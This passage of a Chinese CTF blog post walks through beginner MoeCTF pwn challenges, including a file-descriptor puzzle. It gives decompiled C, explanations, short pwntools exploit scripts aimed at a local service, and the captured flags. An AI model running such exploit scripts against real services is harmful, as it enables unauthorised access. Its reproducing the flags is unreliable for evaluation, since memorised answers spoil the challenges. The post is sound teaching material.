+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">11965</span>) <span class="hljs-comment">#别忘了替换成实际的端口！</span><br><br><span class="hljs-comment"># 接收 Hint (即 num 的原始 8 字节数据)</span><br>p.recvuntil(<span class="hljs-string">b&quot;Here is the hint.&quot;</span>)<br><br><span class="hljs-comment"># read(1, &amp;num, 8u) 发送了 8 个字节，用 recvn(8) 精准接收</span><br>leak_data = p.recvn(<span class="hljs-number">8</span>)<br><br><span class="hljs-comment"># 使用u64将字节流转换为整数</span><br>target_num = u64(leak_data)<br><br><span class="hljs-comment"># 采用sendlineafter 限制发送时机，line适用于scanf函数。b&quot;&gt;&quot;表示等待&gt;提示符再执行函数。</span><br><span class="hljs-comment"># target_num是一个整数，需要先转字符串再转字节流再发送</span><br>p.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>,<span class="hljs-built_in">str</span>(target_num).encode())<br><br><span class="hljs-comment"># 拿到 Shell</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>保存为exp.py，扔进题目文件夹中，直接启动</p>
+<figure>
+  <img src="/img/屏幕截图 2026-02-03 225051.png" srcset="/img/loading.gif" lazyload>
+  <figcaption></figcaption>
+</figure>
+
+<p>看到Win!就说明成功了，现在我们临时拥有了管理员权限，用ls查看当前目录下的文件</p>
+<figure>
+  <img src="/img/屏幕截图 2026-02-03 225105.png" srcset="/img/loading.gif" lazyload>
+  <figcaption></figcaption>
+</figure>
+
+<p>找到名为flag的文件，用<code>cat flag</code>读取它</p>
+<figure>
+  <img src="/img/屏幕截图 2026-02-03 225116.png" srcset="/img/loading.gif" lazyload>
+  <figcaption></figcaption>
+</figure>
+
+<p><strong>moectf{u53ful-TH1ng5-IN-pWNTOOls31911f3e}</strong></p>
+<h2 id="1-find-it"><a href="#1-find-it" class="headerlink" title="1 find it"></a>1 find it</h2><p>拿到附件后IDA反编译，得到如下内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> file[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  init(argc, argv, envp);<br>  v3 = dup(<span class="hljs-number">1</span>);<br>  write(v3, <span class="hljs-string">&quot;I&#x27;ve hidden the fd of stdout. Can you find it?\n&quot;</span>, <span class="hljs-number">0x2Fu</span>);<br>  close(<span class="hljs-number">1</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;fd1);<br>  write(fd1, <span class="hljs-string">&quot;You are right.What would you like to see?\n&quot;</span>, <span class="hljs-number">0x2Au</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s%*c&quot;</span>, file);<br>  open(file, <span class="hljs-number">0</span>);<br>  write(fd1, <span class="hljs-string">&quot;What is its fd?\n&quot;</span>, <span class="hljs-number">0x10u</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;fd2);<br>  read(fd2, &amp;buf, <span class="hljs-number">0x50u</span>);<br>  write(fd1, &amp;buf, <span class="hljs-number">0x50u</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>题目描述告诉我们跟fd有关。fd就是Linux的文件描述符，相当于给文件编号，每运行一个程序时，默认已经分配了0，1，2三个fd：</p>
+<p>0,STDIN (标准输入),默认指向你的键盘。</p>
+<p>1,STDOUT (标准输出),默认指向你的屏幕。</p>
+<p>2,STDERR (标准错误),默认也指向你的屏幕，专门用来报错。</p>
+<p>由于Linux有 **“一切皆文件”**的哲学，所以输入输出这种抽象的东西也被当作文件处理。</p>
+<p>当新打开一个文件或着手动分配一个fd时，会优先从最小的正整数开始分配。</p>
+<p>本题中，首先执行了<code>v3 = dup(1)</code>。dup函数的作用是让程序分配一个fd指向跟dup函数变量值对应的fd指向相同的位置，这里是要指向1所指的位置，也就是屏幕，由于0，1，2已被占用，所以下一个分配的数字是3。将变量v3赋值为3。</p>
+<p>依次审计关键部分</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C">write(v3, <span class="hljs-string">&quot;I&#x27;ve hidden the fd of stdout. Can you find it?\n&quot;</span>, <span class="hljs-number">0x2Fu</span>);<br>close(<span class="hljs-number">1</span>);<br>__isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;fd1);<br></code></pre></td></tr></table></figure>
+
+<p>write函数利用新分配的fd，也就是v3让屏幕显示出了一段话，问你能不能找到控制输出的fd，并关闭了原有的fd1，等待输入一个整数，这里需要输入一个fd的编号。既然1没了，那就剩下刚刚分配的3了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">write(fd1, <span class="hljs-string">&quot;You are right.What would you like to see?\n&quot;</span>, <span class="hljs-number">0x2Au</span>);<br>__isoc99_scanf(<span class="hljs-string">&quot;%s%*c&quot;</span>, file);<br></code></pre></td></tr></table></figure>
+
+<p>问你想要看什么，要输入一个被赋给file的字符串，程序会将它识别为文件名。我们是来找flag的，所以理所当然要输入“flag”这串字符。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C">open(file, <span class="hljs-number">0</span>);<br>write(fd1, <span class="hljs-string">&quot;What is its fd?\n&quot;</span>, <span class="hljs-number">0x10u</span>);<br>__isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;fd2);<br></code></pre></td></tr></table></figure>
+
+<p>程序打开了我们想看的文件，它还怪好的呢。注意这时候程序会分配新的fd给这个文件，而刚才1被关闭了，现在是空闲状态，所以此时这个新打开的文件的fd是1。问我们这个文件的fd，所以回答1。</p>
+<p>由是编写脚本exp.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,实际端口)<br><br>p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br><br>p.sendline(<span class="hljs-string">b&quot;flag&quot;</span>)<br><br>p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>运行，轻松拿下</p>
+<figure>
+  <img src="/img/屏幕截图 2026-02-03 235032.png" srcset="/img/loading.gif" lazyload>
+  <figcaption></figcaption>
+</figure>
+
+<p>知道解题流程后用ncat连接手动交互也可以哦</p>
+<figure>
+  <img src="/img/屏幕截图 2026-02-04 001241.png" srcset="/img/loading.gif" lazyload>
+  <figcaption></figcaption>
+</figure>
+
+<p><strong>moectf{fINd_TH3_h1Dd3N_Fdf0326763dc}</strong></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E7%BD%91%E5%AE%89%E4%B9%8B%E8%B7%AF/" class="print-no-link">#网安之路</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>CTF刷题-pwn（1）</div>
+      <div>https://koyanrush.github.io/2026/02/03/Moectfpwn1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Koyanrush</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年2月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/02/02/CTFShowmisc1/" title="CTF刷题-misc（1）">
+                        <span class="hidden-mobile">CTF刷题-misc（1）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="waline"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createCssLink('https://registry.npmmirror.com/@waline/client/2.15.8/files/dist/waline.css')
+      Fluid.utils.createScript('https://registry.npmmirror.com/@waline/client/2.15.8/files/dist/waline.js', function() {
+        var options = Object.assign(
+          {"serverURL":"https://waline.icant.qzz.io","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis/weibo"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":0,"pageSize":10,"placeholder":"来聊两句吧 ~"},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        Waline.init(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          var imgSelector = '#waline .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+      <div class="col-lg-7 mx-auto nopadding-x-md">
+        <div class="container custom mx-auto">
+          <canvas id="starfield-canvas"></canvas> <script>
+  (function() {
+    var canvas = document.getElementById('starfield-canvas');
+    var ctx = canvas.getContext('2d');
+    var stars = [];
+    var meteors = [];
+    var numStars = 150;
+
+    // 初始化画布
+    function init() {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      stars = [];
+      meteors = [];
+      for (var i = 0; i < numStars; i++) {
+        stars.push({
+          x: Math.random() * canvas.width,
+          y: Math.random() * canvas.height,
+          r: Math.random() * 1.5,
+          speed: Math.random() * 0.2 + 0.1
+        });
+      }
+    }
+
+    // 创建单个流星
+    function createMeteor() {
+      meteors.push({
+        x: Math.random() * canvas.width * 1.5, // 从右侧进入
+        y: Math.random() * canvas.height * 0.5 - 200, // 从顶部随机高度
+        len: Math.random() * 80 + 50, // 尾巴长度
+        speed: Math.random() * 6 + 4, // 飞行速度
+        size: Math.random() * 1 + 0.5 // 流星头大小
+      });
+    }
+
+    function draw() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      
+      // 绘制普通背景星
+      ctx.fillStyle = "rgba(220, 220, 220, 0.8)";
+      ctx.beginPath();
+      for (var i = 0; i < numStars; i++) {
+        var s = stars[i];
+        ctx.moveTo(s.x, s.y);
+        ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
+        // 缓慢下落动态
+        s.y += s.speed;
+        if (s.y > canvas.height) s.y = 0;
+      }
+      ctx.fill();
+
+      // 绘制流星
+      for (var j = 0; j < meteors.length; j++) {
+        var m = meteors[j];
+        // 流星是一个渐变线条
+        var grad = ctx.createLinearGradient(m.x, m.y, m.x + m.len, m.y - m.len);
+        grad.addColorStop(0, "rgba(255, 255, 255, 1)"); // 头
+        grad.addColorStop(1, "rgba(255, 255, 255, 0)"); // 尾巴消失
+        
+        ctx.strokeStyle = grad;
+        ctx.lineWidth = m.size;
+        ctx.lineCap = "round";
+        ctx.beginPath();
+        ctx.moveTo(m.x, m.y);
+        ctx.lineTo(m.x - m.len, m.y + m.len); // 向左下方划过
+        ctx.stroke();
+
+        // 更新流星位置
+        m.x -= m.speed;
+        m.y += m.speed;
+
+        // 移除出界的流星
+        if (m.y > canvas.height + 100 || m.x < -100) {
+          meteors.splice(j, 1);
+          j--;
+        }
+      }
+
+      // 控制流星生成的频率 (数值越大流星越少)
+      if (Math.random() < 0.015) { 
+        createMeteor();
+      }
+    }
+
+    function tick() { draw(); requestAnimationFrame(tick); }
+    init(); tick();
+    window.addEventListener('resize', init);
+  })();
+</script>
+<script>
+  (function() {
+    function injectHomeText() {
+      if (window.location.pathname === '/' || window.location.pathname === '/index.html') {
+        var target = document.querySelector('.header-inner .full-bg-img .banner-text'); 
+        if (target && !document.getElementById('custom-text-container')) {
+          var container = document.createElement('div');
+          container.id = 'custom-text-container';
+          
+          var line1 = document.createElement('div');
+          line1.className = 'custom-animated-line';
+          line1.innerHTML = '电脑端可以看见看板娘哦'; 
+          
+          var line2 = document.createElement('div');
+          line2.className = 'custom-animated-line';
+          line2.style.fontSize = '0.9rem';
+          line2.style.marginTop = '10px';
+          line2.innerHTML = '✨ 切成深色模式吧，上面可以改的 ✨'; 
+
+          container.appendChild(line1);
+          container.appendChild(line2);
+          target.appendChild(container);
+          
+          setTimeout(function() {
+            container.classList.add('start-animation');
+          }, 2800); 
+        }
+      }
+    }
+    injectHomeText();
+    window.addEventListener('load', injectHomeText);
+  })();
+</script>
+<style>
+  /* 星空画布基础样式 */
+  #starfield-canvas {
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    z-index: -1; pointer-events: none; background-color: transparent;
+  }
+
+  /* --- 暗黑模式：透视星空逻辑 --- */
+  [data-user-color-scheme="dark"] #starfield-canvas {
+    display: block;
+    background-color: #05080a; 
+  }
+  [data-user-color-scheme="dark"] #board, 
+  [data-user-color-scheme="dark"] .modal-content,
+  [data-user-color-scheme="dark"] .footer-inner,
+  [data-user-color-scheme="dark"] .navbar {
+    background-color: rgba(13, 17, 23, 0.4) !important;
+    backdrop-filter: none !important;
+    -webkit-backdrop-filter: none !important;
+    border: 1px solid rgba(255, 255, 255, 0.05);
+  }
+  [data-user-color-scheme="dark"] .full-bg-img, 
+  [data-user-color-scheme="dark"] #banner,
+  [data-user-color-scheme="dark"] .mask-flex {
+    background-image: none !important;
+    background-color: transparent !important;
+  }
+
+  /* --- 明亮模式：全页面文字清晰度优化 --- */
+  [data-user-color-scheme="light"] #starfield-canvas {
+    display: none;
+  }
+  
+  [data-user-color-scheme="light"] .banner-text .h2,
+  [data-user-color-scheme="light"] .banner-text h1,
+  [data-user-color-scheme="light"] .index-info .typed-text,
+  [data-user-color-scheme="light"] .custom-animated-line {
+    color: #ffffff !important;
+    text-shadow: 0 0 10px rgba(0, 0, 0, 0.8), 2px 2px 4px rgba(0, 0, 0, 1) !important;
+    font-weight: bold !important;
+  }
+
+  [data-user-color-scheme="light"] .navbar {
+    background-color: rgba(0, 0, 0, 0.15) !important;
+    backdrop-filter: blur(5px);
+  }
+  [data-user-color-scheme="light"] .navbar .nav-link,
+  [data-user-color-scheme="light"] .navbar .navbar-brand {
+    color: #fff !important;
+    text-shadow: 1px 1px 3px rgba(0,0,0,0.8) !important;
+  }
+  [data-user-color-scheme="light"] .mask-flex {
+    background-color: rgba(0, 0, 0, 0.3) !important;
+  }
+
+  /* --- 双行文字动效补丁 --- */
+  #custom-text-container {
+    margin-top: 1.5rem;
+    opacity: 0;
+    visibility: hidden;
+    transform: scale(0.9) translateY(10px);
+    text-align: center;
+  }
+
+  .custom-animated-line {
+    font-size: 1.1rem;
+    font-weight: 500;
+    color: var(--text-color);
+  }
+
+  .start-animation {
+    visibility: visible !important;
+    animation: fadeInZoomCustom 1.5s ease-out forwards;
+  }
+
+  @keyframes fadeInZoomCustom {
+    0% { opacity: 0; transform: scale(0.9) translateY(10px); }
+    100% { opacity: 1; transform: scale(1) translateY(0); }
+  }
+
+  /* 版权声明区 */
+  .post-copyright {
+    margin-top: 3rem; padding: 1rem 1.5rem;
+    border-left: 3px solid #3498db !important;
+    background-color: var(--board-bg-color);
+  }
+  .post-copyright-license { display: none !important; }
+
+  /* --- Waline 评论区透视适配 --- */
+[data-user-color-scheme="dark"] .wl-content, [data-user-color-scheme="dark"] .wl-panel, [data-user-color-scheme="dark"] .wl-header, [data-user-color-scheme="dark"] .wl-footer {
+  background: transparent !important;
+  border-color: rgba(255, 255, 255, 0.1) !important;
+  color: #ddd !important;
+}
+[data-user-color-scheme="dark"] .wl-editor {
+  background: rgba(255, 255, 255, 0.05) !important;
+}
+[data-user-color-scheme="dark"] .wl-btn {
+  background: rgba(52, 152, 219, 0.4) !important;
+  color: #fff !important;
+  border: none;
+} </style>
+        </div>
+      </div>
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
